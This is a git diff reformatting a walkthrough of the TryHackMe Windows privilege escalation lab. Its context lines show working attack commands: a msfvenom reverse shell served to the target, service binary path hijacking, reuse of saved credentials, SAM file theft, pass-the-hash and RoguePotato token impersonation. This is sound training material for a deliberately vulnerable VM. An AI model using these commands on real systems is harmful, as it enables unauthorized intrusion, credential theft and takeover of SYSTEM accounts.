@@ -7,53 +7,63 @@ Access it <a href="https://tryhackme.com/room/windows10privesc">here</a>.<br>
 <img width="1200px" src="https://github.com/user-attachments/assets/9bacec5c-44ca-4799-b190-ffb8d912b160"></p>
 
 <br>
+
+<h1>Summary</h1>
+<p>
+
+- [Generate a Reverse Shell Executable](#2)<br>
+- Service Exploits - [Insecure Service Permissions](#3)<br>
+- Service Exploits - [Unquoted Service Path](#4)<br>
+- Service Exploits - [Weak Registry Permissions](#5)<br>
+- Service Exploits - [Insecure Service Executables](#6)<br>
+- Registry - [AutoRuns](#7)<br>
+- Registry - [AlwaysInstallElevated](#8)<br>
+- Passwords - [Registry](#9)<br>
+- Passwords - [Saved Creds](#10)<br>
+- Passwords - [Security Account Manager (SAM)](#11)<br>
+- Passwords - [Passing the Hash](#12)<br>
+- [Scheduled Tasks](#13)<br>
+- [Insecure GUI Apps](#14)<br>
+- [Startup Apps](#15)<br>
+- Token Impersonation - [Rogue Potato](#16)<br>
+- Token Impersonation - [PrintSpoofer](#17)<br>
+- [Privilege Escalation Scripts](#18)<br></p>
+
+
+<br>
 <h2>Task 1 . Deploy the Vulnerable Windows VM</h2>
 <p>This room is aimed at walking you through a variety of Windows Privilege Escalation techniques.<br>
 
 To do this, you must first deploy an intentionally vulnerable Windows VM.<br>
 
-This VM was created by Sagi Shahar as part of his <a href="https://github.com/sagishahar/lpeworkshop">local privilege escalation workshop</a> but has been updated by <a href="https://twitter.com/TibSec">Tib3rius</a> as part of his <a href="https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574">Windows Privilege Escalation for OSCP and Beyond!</a> course on Udemy.<br><br>
+This VM was created by Sagi Shahar as part of his <a href="https://github.com/sagishahar/lpeworkshop">local privilege escalation workshop</a> but has been updated by <a href="https://twitter.com/TibSec">Tib3rius</a> as part of his <a href="https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574">Windows Privilege Escalation for OSCP and Beyond!</a> course on Udemy.<br>
 
-Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.<br><br>
+Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.<br>
 
-Make sure you are connected to the <a href="https://tryhackme.com/access">TryHackMe VPN</a> or using the in-browser Kali instance before trying to access the Windows VM!<br><br>
+Make sure you are connected to the <a href="https://tryhackme.com/access">TryHackMe VPN</a> or using the in-browser Kali instance before trying to access the Windows VM!<br>
 
-RDP should be available on port 3389 (it may take a few minutes for the service to start). You can login to the "user" account using the password "password321":<br><br>
+RDP should be available on port 3389 (it may take a few minutes for the service to start). You can login to the "user" account using the password "password321":<br>
 
-<code>xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP</code><br><br>
+<code>xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP</code><br>
 
-The next tasks will walk you through different privilege escalation techniques.<br><br>
+The next tasks will walk you through different privilege escalation techniques.<br>
 
-After each technique, you should have a admin or SYSTEM shell.<br><br>
+After each technique, you should have a admin or SYSTEM shell.<br>
 
 <ins>Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task</ins>!<br></p>
 
 <p><em>Answer the question below</em></p>
 
-<p>1.1.Deploy the Windows VM and login using the "user" account.<br>
+<p>1.1. Deploy the Windows VM and login using the "user" account.<br>
 <code>No answer needed</code></p>
 
 ```bash
 :~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:xx.xxx.xx.xx /dynamic-resolution
 ```
 
-<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/7c525352-dd17-49b7-8e00-e1dc5740c33b"></p>
-
+<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/7c525352-dd17-49b7-8e00-e1dc5740c33b"></p>
 
 <br>
-<h1">Summary</h1>
-
-<div align="center"><p>
-
-- [Generate a Reverse Shell Executable](#2)<br>
-- [Service Exploits - Insecure Service Permissions](#3)<br>
-- [Service Exploits - Unquoted Service Path](#4)</p>
-
-
-</p></div><br>
-
-
-
 <h2>Task 2 . Generate a Reverse Shell Executable<a id='2'></a></h2>
 <p>On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:<br>
 
@@ -81,7 +91,7 @@ The reverse.exe executable will be used in many of the tasks in this room, so do
 
 <p><em>Answer the question below</em></p>
 
-<p>2.1. Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!.<br>
+<p>2.1. Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!<br>
 <code>No answer needed</code></p>
 
 ```bash
@@ -94,8 +104,7 @@ Final size of exe file: 7168 bytes
 Saved as: reverse.exe
 ```
 
-<img width="1125" height="189" alt="image" src="https://github.com/user-attachments/assets/5adcdcd8-0a98-4fea-ad66-2f69cd30ed40" />
-
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5adcdcd8-0a98-4fea-ad66-2f69cd30ed40"></p>
 
 ```bash
 :~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:xx.xxx.xx.xx /dynamic-resolution
@@ -125,15 +134,12 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 xx.xxx.xx.xx - - [15/Oct/2025 xx:xx:xx] "GET /reverse.exe HTTP/1.1" 200 -
 ```
 
-
 ```bash
 PS C:\PrivEsc>reverse.exe
 ```
 
-<img width="1175" height="215" alt="image" src="https://github.com/user-attachments/assets/5df3030d-b7de-4945-885c-3e6c6c7abd8d" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5df3030d-b7de-4945-885c-3e6c6c7abd8d"></p>
 
-<br>
-<br>
 <br>
 <h2>Task 3 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Permissions<a id='3'></a></h2>
 <p>Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:<br>
@@ -175,10 +181,8 @@ RW daclsvc
 C:\PrivEsc>
 ```
 
-<img width="864" height="237" alt="image" src="https://github.com/user-attachments/assets/5f12f1d5-a431-404e-9afa-b5ad72ab6c4b" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5f12f1d5-a431-404e-9afa-b5ad72ab6c4b"></p>
 
-<br>
-<br>
 <br>
 
 ```bash
@@ -206,20 +210,12 @@ C:\PrivEsc>sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
 C:\PrivEsc>
 ```
 
-<img width="867" height="317" alt="image" src="https://github.com/user-attachments/assets/9617af30-c31a-4883-a353-a7b693b0f5ce" />
-
-<br>
-<br>
-<br>
-
 ```bash
 C:\PrivEsc>sc net start daclsvc
 ```
 
-<img width="864" height="517" alt="image" src="https://github.com/user-attachments/assets/fcfaa6e6-90f1-4bd3-8c0a-1a9e3f18cfb4" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fcfaa6e6-90f1-4bd3-8c0a-1a9e3f18cfb4"></p>
 
-<br>
-<br>
 <br>
 <h2>Task 4 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Unquoted Service Path<a id='4'></a></h2>
 <p>Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.<br>
@@ -281,8 +277,8 @@ copy C:\PrivEsc\program.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 C:\PrivEsc>net start unquotedsvc
 ```
 
-
-<h2>Task 5 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Weak Registry Permissions</h2>
+<br>
+<h2>Task 5 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Weak Registry Permissions<a id='5'></h2>
 
 <p><em>Answer the question below</em></p>
 
@@ -337,7 +333,8 @@ The operation completed successfully.
 C:\PrivEsc>net start regsvc
 ```
 
-<h2>Task 6 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Executables</h2>
+<br>
+<h2>Task 6 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Executables<a id='6'></h2>
 <p>Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).<br>
 
 <code>sc qc filepermsvc</code><br>
@@ -419,8 +416,8 @@ C:\Windows\system32>
 
 <img width="1097" height="145" alt="image" src="https://github.com/user-attachments/assets/5f90c63d-a144-46c6-b6f9-9de57ff30862" />
 
-
-<h2>Task 7 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - Autoruns</h2>
+<br>
+<h2>Task 7 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - Autoruns<a id='7'></h2>
 <p>Query the registry for AutoRun executables:<br>
 
 <code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code><br>
@@ -532,8 +529,8 @@ Microsoft Windows [Version 10.0.17763.737]
 C:\Windows\system32>
 ```
 
-
-<h2>Task 8 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆-- AlwaysInstallElevated</h2>
+<br>
+<h2>Task 8 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆-- AlwaysInstallElevated<a id='8'></h2>
 
 <p><em>Answer the question below</em></p>
 
@@ -587,7 +584,7 @@ C:\Windows\system32>
 <br>
 <br>
 <br>
-<h2>Task 9 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Registry</h2>
+<h2>Task 9 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Registry<a id='9'></h2>
 <p>(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: <code>password123</code>)<br>
 
 The registry can be searched for keys and values that contain the word "password":</code><br>
@@ -616,7 +613,7 @@ C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon
 <br>
 <br>
 <br>
-<h2>Task 10 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Saved Creds</h2>
+<h2>Task 10 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Saved Creds<a id='10'></h2>
 <p>List any saved credentials:<br>
 
 <code>cmdkey /list</code><br>
@@ -645,7 +642,7 @@ C:\PrivEsc>runas /savecred /user:admin reverse.exe
 <br>
 <br>
 <br>
-<h2 align="center">Task 11 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Security Account Manager (SAM)</h2>
+<h2>Task 11 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Security Account Manager (SAM)<a id='11'></h2>
 <p>The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.<br>
 
 Transfer the SAM and SYSTEM files to your Kali VM:</p>
@@ -695,8 +692,8 @@ Requirement already satisfied: pycrypto in /usr/lib/python3/dist-packages (2.6.1
 <img width="1167" height="241" alt="image" src="https://github.com/user-attachments/assets/228add03-d7de-4198-b9ae-ebe2957d1c43" />
 
 
-
-<h2 align="center">Task 12 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Passing the Hash</h2>
+<br>
+<h2>Task 12 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Passing the Hash<a id='12'></h2>
 <p>Why crack a password hash when you can authenticate using the hash?<br>
 
 Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:<br>
@@ -708,8 +705,8 @@ Use the full admin hash with pth-winexe to spawn a shell running as admin withou
 <p>12.1. Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
-
-<h2 align="center">Task 13 . Scheduled Tasks</h2>
+<br>
+<h2>Task 13 . Scheduled Tasks<a id='13'></h2>
 <p>View the contents of the C:\DevTools\CleanUp.ps1 script:<br>
 
 <code>type C:\DevTools\CleanUp.ps1</code><br>
@@ -729,8 +726,8 @@ Wait for the Scheduled Task to run, which should trigger the reverse shell as SY
 <p>13.1. Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
-
-<h2 align="center">Task 14 . Insecure GUI Apps</h2>
+<br>
+<h2>Task 14 . Insecure GUI Apps<a id='14'></h2>
 <p>Start an RDP session as the "user" account:<br>
 
 <code>rdesktop -u user -p password321 MACHINE_IP</code><br>
@@ -748,8 +745,8 @@ Press Enter to spawn a command prompt running with admin privileges.</p>
 <p>14.1. Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
-
-<h2 align="center">Task 15 . Startup Apps</h2>
+<br>
+<h2>Task 15 . Startup Apps<a id='15'></h2>
 <p>Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:<br>
 
 <code>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</code><br>
@@ -769,8 +766,8 @@ A shell running as admin should connect back to your listener.</p>
 <p>15.1. Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
-
-<h2 align="center">Task 16 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - Rogue Porato</h2>
+<br>
+<h2>Task 16 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - Rogue Porato<a id='16'></h2>
 <p>Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:<br>
 
 <code>sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999</code><br>
@@ -798,8 +795,8 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 <p>16.2. NName the other user privilege that allows this exploit to work..<br>
 <code>______</code></p>
 
-
-<h2 align="center">Task 17 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - PrintSpooler</h2>
+<br>
+<h2>Task 17 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - PrintSpooler<a id='17'></h2>
 <p>Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:<br>
 
 <code>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe</code><br>
@@ -815,8 +812,8 @@ Now, in the "local service" reverse shell you triggered, run the PrintSpoofer ex
 <p>17.1.  Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
-
-<h2 align="center">Task 18 . Privilege Escalation Scripts</h2>
+<br>
+<h2>Task 18 . Privilege Escalation Scripts<a id='18'></h2>
 <p>Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:<br>
 
 - winPEASany.exe<br>
